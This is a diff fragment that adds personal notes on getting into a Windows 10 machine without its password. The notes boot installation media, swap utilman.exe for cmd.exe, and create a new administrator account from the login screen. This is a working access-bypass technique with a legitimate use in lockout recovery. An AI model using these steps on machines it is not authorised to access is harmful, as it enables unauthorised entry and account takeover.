@@ -50,6 +50,26 @@ check again in leo-moon cpu-v> it should be virtualization support ok  - vt-x en
 
 
 
+6- inter in windows 10 with cd break password
+
+1.insert boot media
+2.reboot and boot to installation screen
+3.shift+f10
+4.c:
+5.cd windows\system32
+6. ren utilman.exe utilman.exe.bak
+7. ren cmd.exe utilman.exe
+8. wpeutil reboot
+9. on login screen click on ease of acccess 
+10. net user USERNAME PASSWORD /add
+11. net localgroup Adminstrators USERNAME /add
+
+after all done again
+
+ren utilman.exe cmd.exe
+ren utilman.exe.bak utilman.exe
+
+
 
 
 
